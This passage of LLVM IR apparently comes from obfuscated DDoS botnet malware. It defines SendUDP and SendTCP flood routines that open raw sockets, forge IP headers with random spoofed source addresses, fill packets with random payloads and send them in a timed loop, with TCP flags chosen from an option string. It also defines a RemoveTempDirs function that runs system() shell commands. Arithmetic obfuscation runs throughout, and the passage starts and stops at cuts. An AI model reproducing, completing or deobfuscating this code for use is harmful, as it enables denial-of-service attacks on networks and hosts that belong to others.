  %50 = add i64 %49, %48
  %51 = add i64 %50, -4512290192007235823
  %52 = add nsw i64 %46, %48
  %53 = icmp sge i64 %45, %51
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %39
  %55 = load i32, i32* %7, align 4
  %56 = call i32 @close(i32 %55)
  call void @_exit(i32 0) #11
  unreachable

; <label>:57:                                     ; preds = %39
  store i32 0, i32* %11, align 4
  br label %58

; <label>:58:                                     ; preds = %57, %36
  %59 = load i32, i32* %11, align 4
  %60 = sub i32 0, %59
  %61 = sub i32 0, 1
  %62 = add i32 %60, %61
  %63 = sub i32 0, %62
  %64 = add i32 %59, 1
  store i32 %63, i32* %11, align 4
  br label %36
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %248

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %248

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %248

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %64, %56
  %58 = load i32, i32* %17, align 4
  %59 = sub i32 %58, -1325875096
  %60 = add i32 %59, -1
  %61 = add i32 %60, -1325875096
  %62 = add nsw i32 %58, -1
  store i32 %61, i32* %17, align 4
  %63 = icmp ne i32 %58, 0
  br i1 %63, label %64, label %81

; <label>:64:                                     ; preds = %57
  %65 = call i64 @time(i64* null) #5
  %66 = call i32 @rand_cmwc()
  %67 = zext i32 %66 to i64
  %68 = xor i64 %65, -1
  %69 = and i64 5551683086038741160, %68
  %70 = xor i64 5551683086038741160, -1
  %71 = and i64 %65, %70
  %72 = xor i64 %67, -1
  %73 = and i64 %72, 5551683086038741160
  %74 = and i64 %67, %70
  %75 = or i64 %69, %71
  %76 = or i64 %73, %74
  %77 = xor i64 %75, %76
  %78 = xor i64 %65, %67
  %79 = trunc i64 %77 to i32
  call void @srand(i32 %79) #5
  %80 = call i32 @rand() #5
  call void @init_rand(i32 %80)
  br label %57

; <label>:81:                                     ; preds = %57
  %82 = load i32, i32* %12, align 4
  %83 = add i32 32, 1576230404
  %84 = sub i32 %83, %82
  %85 = sub i32 %84, 1576230404
  %86 = sub nsw i32 32, %82
  %87 = shl i32 1, %85
  %88 = add i32 %87, 187273011
  %89 = sub i32 %88, 1
  %90 = sub i32 %89, 187273011
  %91 = sub nsw i32 %87, 1
  %92 = xor i32 %90, -1
  %93 = and i32 805388876, %92
  %94 = xor i32 805388876, -1
  %95 = and i32 %90, %94
  %96 = xor i32 -1, -1
  %97 = and i32 %96, 805388876
  %98 = and i32 -1, %94
  %99 = or i32 %93, %95
  %100 = or i32 %97, %98
  %101 = xor i32 %99, %100
  %102 = xor i32 %90, -1
  store i32 %101, i32* %18, align 4
  %103 = load i32, i32* %10, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 0, %104
  %106 = sub i64 28, %105
  %107 = add i64 28, %104
  %108 = call i8* @llvm.stacksave()
  store i8* %108, i8** %19, align 8
  %109 = alloca i8, i64 %106, align 16
  %110 = bitcast i8* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %20, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %112 = bitcast %struct.iphdr* %111 to i8*
  %113 = getelementptr i8, i8* %112, i64 20
  %114 = bitcast i8* %113 to %struct.udphdr*
  store %struct.udphdr* %114, %struct.udphdr** %21, align 8
  %115 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %117 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %116, i32 0, i32 0
  %118 = load i32, i32* %117, align 4
  %119 = load i32, i32* %18, align 4
  %120 = call i32 @getRandomIP(i32 %119)
  %121 = call i32 @htonl(i32 %120) #10
  %122 = load i32, i32* %10, align 4
  %123 = sext i32 %122 to i64
  %124 = sub i64 8, -835562770554012886
  %125 = add i64 %124, %123
  %126 = add i64 %125, -835562770554012886
  %127 = add i64 8, %123
  %128 = trunc i64 %126 to i32
  call void @makeIPPacket(%struct.iphdr* %115, i32 %118, i32 %121, i8 zeroext 17, i32 %128)
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = add i64 8, 7685508611128531306
  %132 = add i64 %131, %130
  %133 = sub i64 %132, 7685508611128531306
  %134 = add i64 8, %130
  %135 = trunc i64 %133 to i16
  %136 = call zeroext i16 @htons(i16 zeroext %135) #10
  %137 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %138 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon.1* %138 to %struct.anon.2*
  %140 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %139, i32 0, i32 2
  store i16 %136, i16* %140, align 2
  %141 = call i32 @rand_cmwc()
  %142 = trunc i32 %141 to i16
  %143 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %144 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon.1* %144 to %struct.anon.2*
  %146 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %145, i32 0, i32 0
  store i16 %142, i16* %146, align 2
  %147 = load i32, i32* %8, align 4
  %148 = icmp eq i32 %147, 0
  br i1 %148, label %149, label %151

; <label>:149:                                    ; preds = %81
  %150 = call i32 @rand_cmwc()
  br label %156

; <label>:151:                                    ; preds = %81
  %152 = load i32, i32* %8, align 4
  %153 = trunc i32 %152 to i16
  %154 = call zeroext i16 @htons(i16 zeroext %153) #10
  %155 = zext i16 %154 to i32
  br label %156

; <label>:156:                                    ; preds = %151, %149
  %157 = phi i32 [ %150, %149 ], [ %155, %151 ]
  %158 = trunc i32 %157 to i16
  %159 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  %161 = bitcast %union.anon.1* %160 to %struct.anon.2*
  %162 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %161, i32 0, i32 1
  store i16 %158, i16* %162, align 2
  %163 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon.1* %164 to %struct.anon.2*
  %166 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %165, i32 0, i32 3
  store i16 0, i16* %166, align 2
  %167 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %168 = bitcast %struct.udphdr* %167 to i8*
  %169 = getelementptr inbounds i8, i8* %168, i64 8
  %170 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %169, i32 %170)
  %171 = bitcast i8* %109 to i16*
  %172 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 2
  %174 = load i16, i16* %173, align 2
  %175 = zext i16 %174 to i32
  %176 = call zeroext i16 @csum(i16* %171, i32 %175)
  %177 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 7
  store i16 %176, i16* %178, align 2
  %179 = call i64 @time(i64* null) #5
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = add i64 %179, 6451043275935841350
  %183 = add i64 %182, %181
  %184 = sub i64 %183, 6451043275935841350
  %185 = add nsw i64 %179, %181
  %186 = trunc i64 %184 to i32
  store i32 %186, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %187

; <label>:187:                                    ; preds = %241, %240, %156
  br label %188

; <label>:188:                                    ; preds = %187
  %189 = load i32, i32* %15, align 4
  %190 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %191 = call i64 @sendto(i32 %189, i8* %109, i64 %106, i32 0, %struct.sockaddr* %190, i32 16)
  %192 = call i32 @rand_cmwc()
  %193 = trunc i32 %192 to i16
  %194 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.1* %195 to %struct.anon.2*
  %197 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %196, i32 0, i32 0
  store i16 %193, i16* %197, align 2
  %198 = load i32, i32* %8, align 4
  %199 = icmp eq i32 %198, 0
  br i1 %199, label %200, label %202

; <label>:200:                                    ; preds = %188
  %201 = call i32 @rand_cmwc()
  br label %207

; <label>:202:                                    ; preds = %188
  %203 = load i32, i32* %8, align 4
  %204 = trunc i32 %203 to i16
  %205 = call zeroext i16 @htons(i16 zeroext %204) #10
  %206 = zext i16 %205 to i32
  br label %207

; <label>:207:                                    ; preds = %202, %200
  %208 = phi i32 [ %201, %200 ], [ %206, %202 ]
  %209 = trunc i32 %208 to i16
  %210 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %211 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon.1* %211 to %struct.anon.2*
  %213 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %212, i32 0, i32 1
  store i16 %209, i16* %213, align 2
  %214 = call i32 @rand_cmwc()
  %215 = trunc i32 %214 to i16
  %216 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 3
  store i16 %215, i16* %217, align 4
  %218 = load i32, i32* %18, align 4
  %219 = call i32 @getRandomIP(i32 %218)
  %220 = call i32 @htonl(i32 %219) #10
  %221 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 8
  store i32 %220, i32* %222, align 4
  %223 = bitcast i8* %109 to i16*
  %224 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 2
  %226 = load i16, i16* %225, align 2
  %227 = zext i16 %226 to i32
  %228 = call zeroext i16 @csum(i16* %223, i32 %227)
  %229 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 7
  store i16 %228, i16* %230, align 2
  %231 = load i32, i32* %23, align 4
  %232 = load i32, i32* %14, align 4
  %233 = icmp eq i32 %231, %232
  br i1 %233, label %234, label %241

; <label>:234:                                    ; preds = %207
  %235 = call i64 @time(i64* null) #5
  %236 = load i32, i32* %22, align 4
  %237 = sext i32 %236 to i64
  %238 = icmp sgt i64 %235, %237
  br i1 %238, label %239, label %240

; <label>:239:                                    ; preds = %234
  br label %246

; <label>:240:                                    ; preds = %234
  store i32 0, i32* %23, align 4
  br label %187

; <label>:241:                                    ; preds = %207
  %242 = load i32, i32* %23, align 4
  %243 = sub i32 0, 1
  %244 = sub i32 %242, %243
  %245 = add i32 %242, 1
  store i32 %244, i32* %23, align 4
  br label %187

; <label>:246:                                    ; preds = %239
  %247 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %247)
  br label %248

; <label>:248:                                    ; preds = %246, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare void @srand(i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.291, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.292, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.293, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.294, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %522

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %522

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #5
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %522

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %78

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = sub i32 0, %63
  %65 = add i32 32, %64
  %66 = sub nsw i32 32, %63
  %67 = shl i32 1, %65
  %68 = add i32 %67, 854761948
  %69 = sub i32 %68, 1
  %70 = sub i32 %69, 854761948
  %71 = sub nsw i32 %67, 1
  %72 = xor i32 %70, -1
  %73 = and i32 -1, %72
  %74 = xor i32 -1, -1
  %75 = and i32 %70, %74
  %76 = or i32 %73, %75
  %77 = xor i32 %70, -1
  store i32 %76, i32* %19, align 4
  br label %78

; <label>:78:                                     ; preds = %62, %61
  %79 = load i32, i32* %12, align 4
  %80 = sext i32 %79 to i64
  %81 = sub i64 40, 8222840796299959857
  %82 = add i64 %81, %80
  %83 = add i64 %82, 8222840796299959857
  %84 = add i64 40, %80
  %85 = call i8* @llvm.stacksave()
  store i8* %85, i8** %20, align 8
  %86 = alloca i8, i64 %83, align 16
  %87 = bitcast i8* %86 to %struct.iphdr*
  store %struct.iphdr* %87, %struct.iphdr** %21, align 8
  %88 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %89 = bitcast %struct.iphdr* %88 to i8*
  %90 = getelementptr i8, i8* %89, i64 20
  %91 = bitcast i8* %90 to %struct.tcphdr*
  store %struct.tcphdr* %91, %struct.tcphdr** %22, align 8
  %92 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %94 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = load i32, i32* %19, align 4
  %97 = call i32 @getRandomIP(i32 %96)
  %98 = call i32 @htonl(i32 %97) #10
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 20, -4150156942820951402
  %102 = add i64 %101, %100
  %103 = add i64 %102, -4150156942820951402
  %104 = add i64 20, %100
  %105 = trunc i64 %103 to i32
  call void @makeIPPacket(%struct.iphdr* %92, i32 %95, i32 %98, i8 zeroext 6, i32 %105)
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %109 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %108, i32 0, i32 0
  %110 = bitcast %union.anon* %109 to %struct.anon.0*
  %111 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %110, i32 0, i32 0
  store i16 %107, i16* %111, align 4
  %112 = call i32 @rand_cmwc()
  %113 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %113, i32 0, i32 0
  %115 = bitcast %union.anon* %114 to %struct.anon.0*
  %116 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %115, i32 0, i32 2
  store i32 %112, i32* %116, align 4
  %117 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon* %118 to %struct.anon.0*
  %120 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %119, i32 0, i32 3
  store i32 0, i32* %120, align 4
  %121 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %122 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %121, i32 0, i32 0
  %123 = bitcast %union.anon* %122 to %struct.anon.0*
  %124 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %123, i32 0, i32 4
  %125 = load i16, i16* %124, align 4
  %126 = xor i16 -241, -1
  %127 = xor i16 %125, %126
  %128 = and i16 %127, %125
  %129 = and i16 %125, -241
  %130 = and i16 %128, 80
  %131 = xor i16 %128, 80
  %132 = or i16 %130, %131
  %133 = or i16 %128, 80
  store i16 %132, i16* %124, align 4
  %134 = load i8*, i8** %11, align 8
  %135 = call i32 @strcmp(i8* %134, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.296, i32 0, i32 0)) #9
  %136 = icmp ne i32 %135, 0
  br i1 %136, label %255, label %137

; <label>:137:                                    ; preds = %78
  %138 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %139 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon* %139 to %struct.anon.0*
  %141 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %140, i32 0, i32 4
  %142 = load i16, i16* %141, align 4
  %143 = xor i16 %142, -1
  %144 = xor i16 -513, -1
  %145 = xor i16 -30278, -1
  %146 = or i16 %143, %144
  %147 = or i16 -30278, %145
  %148 = xor i16 %146, -1
  %149 = and i16 %148, %147
  %150 = and i16 %142, -513
  %151 = and i16 %149, 512
  %152 = xor i16 %149, 512
  %153 = or i16 %151, %152
  %154 = or i16 %149, 512
  store i16 %153, i16* %141, align 4
  %155 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %155, i32 0, i32 0
  %157 = bitcast %union.anon* %156 to %struct.anon.0*
  %158 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %157, i32 0, i32 4
  %159 = load i16, i16* %158, align 4
  %160 = xor i16 %159, -1
  %161 = xor i16 -1025, -1
  %162 = xor i16 7236, -1
  %163 = or i16 %160, %161
  %164 = or i16 7236, %162
  %165 = xor i16 %163, -1
  %166 = and i16 %165, %164
  %167 = and i16 %159, -1025
  %168 = xor i16 %166, -1
  %169 = xor i16 1024, -1
  %170 = xor i16 -7386, -1
  %171 = and i16 %168, -7386
  %172 = and i16 %166, %170
  %173 = and i16 %169, -7386
  %174 = and i16 1024, %170
  %175 = or i16 %171, %172
  %176 = or i16 %173, %174
  %177 = xor i16 %175, %176
  %178 = or i16 %168, %169
  %179 = xor i16 %178, -1
  %180 = or i16 -7386, %170
  %181 = and i16 %179, %180
  %182 = or i16 %177, %181
  %183 = or i16 %166, 1024
  store i16 %182, i16* %158, align 4
  %184 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon* %185 to %struct.anon.0*
  %187 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %186, i32 0, i32 4
  %188 = load i16, i16* %187, align 4
  %189 = xor i16 %188, -1
  %190 = xor i16 -257, -1
  %191 = xor i16 4941, -1
  %192 = or i16 %189, %190
  %193 = or i16 4941, %191
  %194 = xor i16 %192, -1
  %195 = and i16 %194, %193
  %196 = and i16 %188, -257
  %197 = xor i16 %195, -1
  %198 = xor i16 256, -1
  %199 = xor i16 -24034, -1
  %200 = and i16 %197, -24034
  %201 = and i16 %195, %199
  %202 = and i16 %198, -24034
  %203 = and i16 256, %199
  %204 = or i16 %200, %201
  %205 = or i16 %202, %203
  %206 = xor i16 %204, %205
  %207 = or i16 %197, %198
  %208 = xor i16 %207, -1
  %209 = or i16 -24034, %199
  %210 = and i16 %208, %209
  %211 = or i16 %206, %210
  %212 = or i16 %195, 256
  store i16 %211, i16* %187, align 4
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon* %214 to %struct.anon.0*
  %216 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %215, i32 0, i32 4
  %217 = load i16, i16* %216, align 4
  %218 = xor i16 %217, -1
  %219 = xor i16 -4097, -1
  %220 = xor i16 -20563, -1
  %221 = or i16 %218, %219
  %222 = or i16 -20563, %220
  %223 = xor i16 %221, -1
  %224 = and i16 %223, %222
  %225 = and i16 %217, -4097
  %226 = and i16 %224, 4096
  %227 = xor i16 %224, 4096
  %228 = or i16 %226, %227
  %229 = or i16 %224, 4096
  store i16 %228, i16* %216, align 4
  %230 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon* %231 to %struct.anon.0*
  %233 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %232, i32 0, i32 4
  %234 = load i16, i16* %233, align 4
  %235 = xor i16 -2049, -1
  %236 = xor i16 %234, %235
  %237 = and i16 %236, %234
  %238 = and i16 %234, -2049
  %239 = xor i16 %237, -1
  %240 = xor i16 2048, -1
  %241 = xor i16 1001, -1
  %242 = and i16 %239, 1001
  %243 = and i16 %237, %241
  %244 = and i16 %240, 1001
  %245 = and i16 2048, %241
  %246 = or i16 %242, %243
  %247 = or i16 %244, %245
  %248 = xor i16 %246, %247
  %249 = or i16 %239, %240
  %250 = xor i16 %249, -1
  %251 = or i16 1001, %241
  %252 = and i16 %250, %251
  %253 = or i16 %248, %252
  %254 = or i16 %237, 2048
  store i16 %253, i16* %233, align 4
  br label %407

; <label>:255:                                    ; preds = %78
  %256 = load i8*, i8** %11, align 8
  %257 = call i8* @strtok(i8* %256, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %257, i8** %23, align 8
  br label %258

; <label>:258:                                    ; preds = %404, %255
  %259 = load i8*, i8** %23, align 8
  %260 = icmp ne i8* %259, null
  br i1 %260, label %261, label %406

; <label>:261:                                    ; preds = %258
  %262 = load i8*, i8** %23, align 8
  %263 = call i32 @strcmp(i8* %262, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.298, i32 0, i32 0)) #9
  %264 = icmp ne i32 %263, 0
  br i1 %264, label %279, label %265

; <label>:265:                                    ; preds = %261
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon* %267 to %struct.anon.0*
  %269 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = xor i16 -513, -1
  %272 = xor i16 %270, %271
  %273 = and i16 %272, %270
  %274 = and i16 %270, -513
  %275 = and i16 %273, 512
  %276 = xor i16 %273, 512
  %277 = or i16 %275, %276
  %278 = or i16 %273, 512
  store i16 %277, i16* %269, align 4
  br label %404

; <label>:279:                                    ; preds = %261
  %280 = load i8*, i8** %23, align 8
  %281 = call i32 @strcmp(i8* %280, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.299, i32 0, i32 0)) #9
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %301, label %283

; <label>:283:                                    ; preds = %279
  %284 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 0
  %286 = bitcast %union.anon* %285 to %struct.anon.0*
  %287 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = xor i16 %288, -1
  %290 = xor i16 -1025, -1
  %291 = xor i16 16114, -1
  %292 = or i16 %289, %290
  %293 = or i16 16114, %291
  %294 = xor i16 %292, -1
